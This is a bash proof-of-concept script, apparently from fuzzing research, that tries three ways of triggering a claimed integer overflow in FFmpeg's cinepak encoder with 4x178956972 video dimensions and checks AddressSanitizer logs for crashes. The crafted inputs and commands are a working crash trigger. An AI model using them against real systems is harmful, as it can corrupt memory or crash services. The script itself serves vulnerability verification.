#!/bin/bash
# PoC runner for VULN 001: Integer Overflow in cinepak_encode_init
# libavcodec/cinepakenc.c lines 181-188
set -uo pipefail

SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
cd "$SCRIPT_DIR"

BIN=/data/ylwang/non-textfuzz/target/FFmpeg/build_test/ffmpeg
RESULT_FILE="$SCRIPT_DIR/vuln_001_result.txt"

echo "=== VULN 001 PoC: cinepak_encode_init integer overflow ===" | tee "$RESULT_FILE"
echo "Date: $(date)" | tee -a "$RESULT_FILE"
echo "" | tee -a "$RESULT_FILE"

# Step 1: Generate the AVI input file
echo "[*] Generating malicious AVI..." | tee -a "$RESULT_FILE"
python3 vuln_001_gen.py 2>&1 | tee -a "$RESULT_FILE"
echo "" | tee -a "$RESULT_FILE"

# Step 2: Try Approach A — AVI file with width=4, height=178956972
echo "[*] Approach A: AVI with overflow dimensions (4x178956972)" | tee -a "$RESULT_FILE"
echo "    Command: $BIN -i vuln_001_input.avi -c:v cinepak -f avi /dev/null" | tee -a "$RESULT_FILE"
ASAN_OPTIONS="abort_on_error=0:log_path=$SCRIPT_DIR/asan_a.log:detect_leaks=0" \
    timeout 30 "$BIN" -y -i vuln_001_input.avi -c:v cinepak -f avi /dev/null \
    >> "$RESULT_FILE" 2>&1 || true

echo "" | tee -a "$RESULT_FILE"
echo "[*] ASAN log from Approach A:" | tee -a "$RESULT_FILE"
cat "$SCRIPT_DIR"/asan_a.log.* >> "$RESULT_FILE" 2>/dev/null || echo "    (no ASAN log)" | tee -a "$RESULT_FILE"
echo "" | tee -a "$RESULT_FILE"

# Step 3: Try Approach B — lavfi synthetic source (bypasses AVI dimension check)
echo "[*] Approach B: lavfi color source with overflow dimensions" | tee -a "$RESULT_FILE"
echo "    Command: $BIN -f lavfi -i color=size=4x178956972:rate=1 -frames:v 1 -c:v cinepak -f avi /dev/null" | tee -a "$RESULT_FILE"
ASAN_OPTIONS="abort_on_error=0:log_path=$SCRIPT_DIR/asan_b.log:detect_leaks=0" \
    timeout 30 "$BIN" -y -f lavfi -i "color=size=4x178956972:rate=1" -frames:v 1 -c:v cinepak -f avi /dev/null \
    >> "$RESULT_FILE" 2>&1 || true

echo "" | tee -a "$RESULT_FILE"
echo "[*] ASAN log from Approach B:" | tee -a "$RESULT_FILE"
cat "$SCRIPT_DIR"/asan_b.log.* >> "$RESULT_FILE" 2>/dev/null || echo "    (no ASAN log)" | tee -a "$RESULT_FILE"
echo "" | tee -a "$RESULT_FILE"

# Step 4: Try Approach C — rawvideo input with -s flag to force encoder dimensions
# Using a tiny 4x4 frame but telling the cinepak encoder the output is 4x178956972
echo "[*] Approach C: rawvideo 4x4 with -s 4x178956972 output resize for encoder" | tee -a "$RESULT_FILE"
# Generate a tiny raw RGB24 4x4 frame (48 bytes)
python3 -c "import sys; sys.stdout.buffer.write(b'\x00'*48)" > /tmp/tiny_frame.raw 2>/dev/null || true
echo "    Command: $BIN -f rawvideo -pix_fmt rgb24 -s 4x4 -r 1 -i /tmp/tiny_frame.raw -vf scale=4:178956972 -c:v cinepak -f avi /dev/null" | tee -a "$RESULT_FILE"
ASAN_OPTIONS="abort_on_error=0:log_path=$SCRIPT_DIR/asan_c.log:detect_leaks=0" \
    timeout 30 "$BIN" -y -f rawvideo -pix_fmt rgb24 -s 4x4 -r 1 -i /tmp/tiny_frame.raw \
    -vf scale=4:178956972 -c:v cinepak -f avi /dev/null \
    >> "$RESULT_FILE" 2>&1 || true

echo "" | tee -a "$RESULT_FILE"
echo "[*] ASAN log from Approach C:" | tee -a "$RESULT_FILE"
cat "$SCRIPT_DIR"/asan_c.log.* >> "$RESULT_FILE" 2>/dev/null || echo "    (no ASAN log)" | tee -a "$RESULT_FILE"
echo "" | tee -a "$RESULT_FILE"

# Step 5: Check for crash indicators
echo "[*] Checking result for crash indicators..." | tee -a "$RESULT_FILE"
if grep -qiE "heap-buffer-overflow|heap overflow|AddressSanitizer|stack-buffer-overflow|use-after-free|SIGSEGV|Segmentation fault|double free|heap-use-after-free" "$RESULT_FILE" 2>/dev/null; then
    echo "CRASH_DETECTED" | tee -a "$RESULT_FILE"
    echo "VERIFIED_CRASH" > "$SCRIPT_DIR/vuln_001_status.txt"
elif grep -qiE "Invalid.*width|Invalid.*height|Picture size.*invalid|Ignoring invalid|integer overflow|too large" "$RESULT_FILE" 2>/dev/null; then
    echo "SIZE_CHECK_TRIGGERED - overflow blocked by dimension validation" | tee -a "$RESULT_FILE"
    echo "UNVERIFIED" > "$SCRIPT_DIR/vuln_001_status.txt"
else
    echo "NO_CRASH_DETECTED" | tee -a "$RESULT_FILE"
    echo "UNVERIFIED" > "$SCRIPT_DIR/vuln_001_status.txt"
fi

echo "" | tee -a "$RESULT_FILE"
echo "=== Done ===" | tee -a "$RESULT_FILE"
echo "EXIT=0" >> "$RESULT_FILE"
